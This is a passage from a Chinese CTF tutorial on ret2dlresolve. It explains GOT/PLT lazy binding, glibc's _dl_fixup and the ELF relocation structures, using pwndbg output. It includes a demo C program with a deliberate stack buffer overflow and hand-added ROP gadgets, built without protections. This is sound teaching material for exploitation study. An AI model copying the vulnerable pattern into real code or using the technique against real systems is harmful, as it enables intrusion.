<p>至于第三项，自然就是 <code>_dl_runtime_resolve</code> 地址。至于函数的<code>got</code>表项</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /home/r3t2/ctf/moectf2025/pwn/nowaytoleak/pwn_patched:</span><br><span class="line">GOT protection: Partial RELRO | Found 4 GOT entries passing the filter</span><br><span class="line">[0x404018] write@GLIBC_2.2.5 -&gt; 0x401030 ◂— endbr64</span><br><span class="line">[0x404020] strlen@GLIBC_2.2.5 -&gt; 0x401040 ◂— endbr64</span><br><span class="line">[0x404028] setbuf@GLIBC_2.2.5 -&gt; 0x401050 ◂— endbr64</span><br><span class="line">[0x404030] read@GLIBC_2.2.5 -&gt; 0x401060 ◂— endbr64</span><br><span class="line">pwndbg&gt; x/8i 0x401030</span><br><span class="line">   0x401030:    endbr64</span><br><span class="line">   0x401034:    push   0x0</span><br><span class="line">   0x401039:    bnd jmp 0x401020</span><br><span class="line">   0x40103f:    nop</span><br><span class="line">   0x401040:    endbr64</span><br><span class="line">   0x401044:    push   0x1</span><br><span class="line">   0x401049:    bnd jmp 0x401020</span><br><span class="line">   0x40104f:    nop</span><br></pre></td></tr></tbody></table></figure>

<p>看解析前函数<code>got</code>表项的地址处的指令，正是<code>push reloc_index; jmp plt[0]</code>，且正位于<code>plt[0]</code>下方<br>解析后（ <code>_dl_runtime_resolve</code> 函数的工作）</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /home/r3t2/ctf/moectf2025/pwn/nowaytoleak/pwn_patched:</span><br><span class="line">GOT protection: Partial RELRO | Found 4 GOT entries passing the filter</span><br><span class="line">[0x404018] write@GLIBC_2.2.5 -&gt; 0x7ffff7ee3280 (write) ◂— endbr64</span><br><span class="line">[0x404020] strlen@GLIBC_2.2.5 -&gt; 0x7ffff7f5d900 ◂— endbr64</span><br><span class="line">[0x404028] setbuf@GLIBC_2.2.5 -&gt; 0x7ffff7e60ad0 (setbuf) ◂— endbr64</span><br><span class="line">[0x404030] read@GLIBC_2.2.5 -&gt; 0x401060 ◂— endbr64</span><br></pre></td></tr></tbody></table></figure>

<p>调用过的函数<code>got</code>表项存放的就是<code>libc</code>中的地址了。</p>
<h2 id="0x02-dl-runtime-resolve函数"><a href="#0x02-dl-runtime-resolve函数" class="headerlink" title="0x02 _dl_runtime_resolve函数"></a>0x02 _dl_runtime_resolve函数</h2><h4 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">{</span>  </span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span>  </span><br><span class="line">  <span class="class"><span class="keyword">union</span>  </span></span><br><span class="line"><span class="class">    {</span>  </span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span>  </span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span>  </span><br><span class="line">    } d_un;  </span><br><span class="line">} Elf64_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">} Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">} Elf64_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">} Elf64_Rela;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">                             ELF 文件 (可执行文件或共享库)</span><br><span class="line">                                     │</span><br><span class="line">                                     ▼</span><br><span class="line">        +-------------------------------------------------------------+</span><br><span class="line">        |                        .dynamic (段)                         |</span><br><span class="line">        |                  (包含多个 Elf64_Dyn 结构体)                   |</span><br><span class="line">        +-------------------------------------------------------------+</span><br><span class="line">        │  (动态加载器 ld.so 读取此段, 找到所有需要的动态信息表的地址)</span><br><span class="line">        │</span><br><span class="line">        ├─ d_tag: DT_SYMTAB  ─ d_un.d_ptr ─▶ .dynsym (动态符号表, Elf64_Sym[])</span><br><span class="line">        │</span><br><span class="line">        ├─ d_tag: DT_STRTAB  ─ d_un.d_ptr ─▶ .dynstr (动态字符串表)</span><br><span class="line">        │</span><br><span class="line">        ├─ d_tag: DT_JMPREL  ─ d_un.d_ptr ─▶ .rela.plt (PLT的重定位表, Elf64_Rela[])</span><br><span class="line">        │</span><br><span class="line">        └─ d_tag: DT_PLTGOT  ─ d_un.d_ptr ─▶ .got.plt (全局偏移量表的一部分)</span><br><span class="line">                                             │</span><br><span class="line">                                             └──────────────┐</span><br><span class="line">                                                            │</span><br><span class="line">  (第N次调用某函数时, 直接通过 GOT 跳转)                         │ (地址回填的目标)</span><br><span class="line">                                                            │</span><br><span class="line">┌───────────────────────────────────────────────────────────┘</span><br><span class="line">│</span><br><span class="line">│ 第一次调用函数 (例如 `puts@plt`) 时触发解析流程：</span><br><span class="line">│</span><br><span class="line">│ 1. PLT 代码跳转到动态加载器 (ld.so) 的符号解析函数 `_dl_runtime_resolve`</span><br><span class="line">│</span><br><span class="line">│ 2. 解析器根据传入的索引 `j`, 定位到 .rela.plt[j]</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">▼</span><br><span class="line">+---------------------------------+</span><br><span class="line">|      .rela.plt[j]               |</span><br><span class="line">|      (Elf64_Rela 结构体)         |</span><br><span class="line">+---------------------------------+</span><br><span class="line">     │                          │</span><br><span class="line">     │ r_offset: VAddr          │ r_info: (i &lt;&lt; 32) | type</span><br><span class="line">     │ (要回填的地址, 通常在.got.plt内) │ (高32位是符号索引 i, 低32位是重定位类型)</span><br><span class="line">     │                          │</span><br><span class="line">     └───────────┐              └───────────┐</span><br><span class="line">                 │                          │</span><br><span class="line">                 │                          ▼</span><br><span class="line">                 │             +---------------------------------+</span><br><span class="line">                 │             |      .dynsym[i]                 |</span><br><span class="line">                 │             |      (Elf64_Sym 结构体)          |</span><br><span class="line">                 │             +---------------------------------+</span><br><span class="line">                 │                          │</span><br><span class="line">                 │                          │ st_name: offset (字符串偏移)</span><br><span class="line">                 │                          │</span><br><span class="line">                 │                          └───────────┐</span><br><span class="line">                 │                                      │</span><br><span class="line">                 │                                      ▼</span><br><span class="line">                 │             +---------------------------------+</span><br><span class="line">                 │             |      .dynstr (字符串池)          |</span><br><span class="line">                 │             +---------------------------------+</span><br><span class="line">                 │                          │</span><br><span class="line">                 │                          ▼</span><br><span class="line">                 │                      符号名字符串 (例如 "puts")</span><br><span class="line">                 │</span><br><span class="line">                 │</span><br><span class="line">                 │ 3. 动态加载器在所有已加载的库中查找这个符号 ("puts")</span><br><span class="line">                 │</span><br><span class="line">                 │ 4. 找到 "puts" 在 libc.so 中的真实地址 (假设为 0xDEADBEEF)</span><br><span class="line">                 │</span><br><span class="line">                 ▼</span><br><span class="line">+---------------------------------+</span><br><span class="line">|      .got.plt[k]                | ──────▶  将地址 0xDEADBEEF 写入这里</span><br><span class="line">| (地址由 r_offset 指向)         |</span><br><span class="line">+---------------------------------+</span><br><span class="line">  (写入前: 指向PLT的下一条指令)</span><br><span class="line">  (写入后: 存储函数真实地址 0xDEADBEEF)</span><br></pre></td></tr></tbody></table></figure>

<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><p>源码比较长，位于<code>glibc/elf/dl-runtime.c</code>，这里就不写读源码的流水账了，放上大佬整理后的核心逻辑<code>Orz</code></p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(truct link_map *l, ElfW(Word) reloc_arg) {</span><br><span class="line">    <span class="comment">// 获取符号表地址</span></span><br><span class="line">    <span class="meta"># <span class="keyword">define</span> D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">// 获取字符串表地址</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">    <span class="comment">// 获取函数对应的重定位表结构地址，sizeof (PLTREL) 即 Elf*_Rel 的大小。</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> reloc_offset reloc_arg * sizeof (PLTREL)</span></span><br><span class="line">    <span class="meta"># <span class="keyword">define</span> PLTREL  ElfW(Rel)</span></span><br><span class="line">    <span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 获取函数对应的符号表结构地址</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 得到函数对应的got地址，即真实函数地址要填回的地址</span></span><br><span class="line">    <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *) (l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="type">lookup_t</span> result;</span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断重定位表的类型，必须要为 ELF_MACHINE_JMP_SLOT(7)  这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">       used don't look in the global scope.  */</span></span><br><span class="line">    <span class="comment">// ☆ 关键判断，决定目标函数地址的查找方法。☆</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) {</span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) {</span><br><span class="line">            <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">                version = <span class="literal">NULL</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">       not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">       we are not using any threads (yet).  */</span></span><br><span class="line">        <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) {</span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">// 查找目标函数地址</span></span><br><span class="line">        <span class="comment">// result 为 libc 的 link_map ，其中有 libc 的基地址。</span></span><br><span class="line">        <span class="comment">// sym 指针指向 libc 中目标函数对应的符号表，其中有目标函数在 libc 中的偏移。</span></span><br><span class="line">        result = _dl_lookup_symbol_x(strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                                     version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">       of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">       offset.  */</span></span><br><span class="line">        <span class="comment">// 基址 + 偏移算出目标函数地址 value</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">       address) is also known.  */</span></span><br><span class="line">        <span class="comment">// 这里认为 link_map 和 sym 中已经是目标函数的信息了，因此直接计算目标函数地址。</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">        result = l;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">    value = elf_machine_plt_value(l, reloc, value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">        &amp;&amp; __builtin_expect(ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">        value = elf_ifunc_invoke(DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    <span class="comment">// 更新 got 表</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt(l, result, reloc, rel_addr, value);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h2 id="0x03-ret2dlresolve"><a href="#0x03-ret2dlresolve" class="headerlink" title="0x03 ret2dlresolve"></a>0x03 ret2dlresolve</h2><h4 id="Notion"><a href="#Notion" class="headerlink" title="Notion"></a>Notion</h4><p><code>l_info[DT_STRTAB]</code>指针：位于<code>link_map_addr +0x68</code><br><code>l_info[DT_SYMTAB]</code>指针：位于<code>link_map_addr + 0x70</code><br><code>l_info[DT_JMPREL]</code>指针：位于<code>link_map_addr +0xF8</code><br><strong>64位下，<code>_dl_runtime_resolve</code>的参数仍然是用栈传递</strong></p>
<p>使用以下demo （方便演示手动加了<code>gadget</code>）</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((naked, noinline, used, visibility(<span class="string">"default"</span>)))</span><br><span class="line"><span class="type">void</span> <span class="title function_">gadget</span><span class="params">(<span class="type">void</span>)</span> {</span><br><span class="line">  __asm__ __volatile__(</span><br><span class="line">    <span class="string">"pop %rdi\n\t"</span></span><br><span class="line">    <span class="string">"ret\n\t"</span></span><br><span class="line">    <span class="string">"pop %rsi\n\t"</span></span><br><span class="line">    <span class="string">"ret\n\t"</span></span><br><span class="line">    <span class="string">"pop %rdx\n\t"</span></span><br><span class="line">    <span class="string">"ret\n\t"</span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">"Welcome to XDCTF2015~!\n"</span>;</span><br><span class="line"> </span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">// NO RELRO：gcc -fno-stack-protector -z norelro -no-pie pwn.c -o pwn</span></span><br><span class="line"><span class="comment">// PARTIAL RELRO：gcc -fno-stack-protector -z relro -no-pie pwn.c -o pwn2</span></span><br><span class="line"><span class="comment">// glibc2.35-0ubuntu3.10</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h4><p>这个只有在 <code>.dynamic</code> 可写时，即<code>NO RELRO</code>。因为 <code>_dl_runtime_resolve</code> 会从 <code>.dynamic</code> 里面拿 <code>.dynstr</code> 字符串表的指针，然后加上 <code>offset</code> 取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当解析的时候，就能解析成我们所指定的任意库函数。<br>我们看原来的<code>.dynstr</code>，并找到<code>.dynamic</code>中存储这个<code>strtab</code>的地址</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; elfsections</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End     Perm       Size  Name</span><br><span class="line">          0x4002e0           0x4002fc      R--       0x1c  .interp</span><br><span class="line">          0x400300           0x400330      R--       0x30  .note.gnu.property</span><br><span class="line">          0x400330           0x400354      R--       0x24  .note.gnu.build-id</span><br><span class="line">          0x400354           0x400374      R--       0x20  .note.ABI-tag</span><br><span class="line">          0x400378           0x4003a0      R--       0x28  .gnu.hash</span><br><span class="line">          0x4003a0           0x400478      R--       0xd8  .dynsym</span><br><span class="line">          0x400478           0x4004e1      R--       0x69  .dynstr</span><br><span class="line">          0x4004e2           0x4004f4      R--       0x12  .gnu.version</span><br><span class="line">          0x4004f8           0x400528      R--       0x30  .gnu.version_r</span><br><span class="line">          0x400528           0x400588      R--       0x60  .rela.dyn</span><br><span class="line">          0x400588           0x4005e8      R--       0x60  .rela.plt</span><br><span class="line">          0x401000           0x40101b      R-X       0x1b  .init</span><br><span class="line">          0x401020           0x401070      R-X       0x50  .plt</span><br><span class="line">          0x401070           0x4010b0      R-X       0x40  .plt.sec</span><br><span class="line">          0x4010b0           0x4012ab      R-X      0x1fb  .text</span><br><span class="line">          0x4012ac           0x4012b9      R-X        0xd  .fini</span><br><span class="line">          0x402000           0x402004      R--        0x4  .rodata</span><br><span class="line">          0x402004           0x402048      R--       0x44  .eh_frame_hdr</span><br><span class="line">          0x402048           0x402120      R--       0xd8  .eh_frame</span><br><span class="line">          0x403120           0x403128      RW-        0x8  .init_array</span><br><span class="line">          0x403128           0x403130      RW-        0x8  .fini_array</span><br><span class="line">          0x403130           0x403300      RW-      0x1d0  .dynamic</span><br><span class="line">          0x403300           0x403310      RW-       0x10  .got</span><br><span class="line">          0x403310           0x403348      RW-       0x38  .got.plt</span><br><span class="line">          0x403348           0x403358      RW-       0x10  .data</span><br><span class="line">          0x403360           0x403380      RW-       0x20  .bss</span><br><span class="line">pwndbg&gt; x/13s 0x400478</span><br><span class="line">0x400478:       ""</span><br><span class="line">0x400479:       "read"</span><br><span class="line">0x40047e:       "write"</span><br><span class="line">0x400484:       "__libc_start_main"</span><br><span class="line">0x400496:       "stdout"</span><br><span class="line">0x40049d:       "strlen"</span><br><span class="line">0x4004a4:       "stdin"</span><br><span class="line">0x4004aa:       "setbuf"</span><br><span class="line">0x4004b1:       "libc.so.6"</span><br><span class="line">0x4004bb:       "GLIBC_2.2.5"</span><br><span class="line">0x4004c7:       "GLIBC_2.34"</span><br><span class="line">0x4004d2:       "__gmon_start__"</span><br><span class="line">0x4004e1:       ""</span><br><span 